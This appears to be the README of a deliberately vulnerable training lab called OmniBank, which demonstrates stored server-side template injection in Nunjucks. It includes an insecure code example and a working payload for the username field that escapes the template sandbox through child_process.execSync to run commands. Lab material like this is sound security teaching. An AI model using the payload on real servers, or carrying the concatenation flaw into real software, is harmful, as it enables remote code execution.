````markdown
#  OmniBank — Stored SSTI to RCE Lab

A realistic banking infrastructure lab designed to demonstrate a **Critical Stored Server-Side Template Injection (SSTI)** vulnerability.

Unlike common **reflected SSTI** tutorials where the exploit triggers immediately, this lab simulates a **stored attack vector**. You must inject your payload into a persistent field (**Username**) during registration, which then detonates later when the system generates transactional emails.

---

## The “Template” Mistake

Modern banking apps often use template engines (like **Nunjucks**, **Handlebars**, or **Jinja2**) to generate dynamic emails.

**The Vulnerability:** Developers sometimes concatenate user input directly into the template string instead of passing it as a variable.

```js
// INSECURE (Vulnerable to SSTI)
nunjucks.renderString("Hello " + username);

// SECURE
nunjucks.renderString("Hello {{ user }}", { user: username });
````

If the username is stored in the database as:

```txt
{{ 7*7 }}
```

…the insecure code renders it as:

```txt
Hello 49
```

If it contains a shell payload, the server executes it.

---

## 🚨 The Kill Chain

### **1) The Injection (Registration)**

* Attacker registers a new bank account.
* Input: Malicious Nunjucks payload injected into the **Username** field.
* Storage: Payload is saved into the database.

### **2) The Trigger (Email Generation)**

* The system attempts to send a **“Welcome to OmniBank”** email (viewable in the **Secure Inbox**).
* The backend pulls the username from the DB and compiles the template.

### **3) The Execution (RCE)**

* The template engine processes the malicious tags, breaking out of the sandbox and executing system commands on the host.

---

## 📦 Installation & Setup

### ✅ Prerequisites

* **Node.js v14+**

### 🚀 Quick Start

```bash
# 1. Clone the repository
git clone https://github.com/aptspider/omnibank-ssti.git
cd omnibank-ssti

# 2. Install dependencies
npm install

# 3. Start the banking portal
node server.js
```

Access the lab:

```txt
http://localhost:3000
```

---

## 💀 Exploit Guide

### **Step 1: Detection (The Math Test)**

Register a new account with the username:

```txt
{{ 7*7 }}
```

Navigate to your **Secure Inbox** and open the Welcome Email.

✅ Result:

```txt
Dear 49,
```

**Analysis:** The server evaluated the math. **SSTI confirmed.**

---

### **Step 2: Sandbox Escape (Node.js RCE)**

Since this is Nunjucks running on Node.js, we need to access the global `process` object to require `child_process`.

Payload (register with this username):

```txt
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('whoami').toString()")() }}
```

✅ Result:
The email body will display the output of the `whoami` command (e.g., `root` or `www-data`), confirming **Remote Code Execution**.

---

## ⚠️ Disclaimer

This application contains **intentional security vulnerabilities**.

**Do NOT** run this application on a public server or production environment.
Use only for **educational purposes** and **authorized testing**.

Created for the **Bug Bounty Series**.

```
```
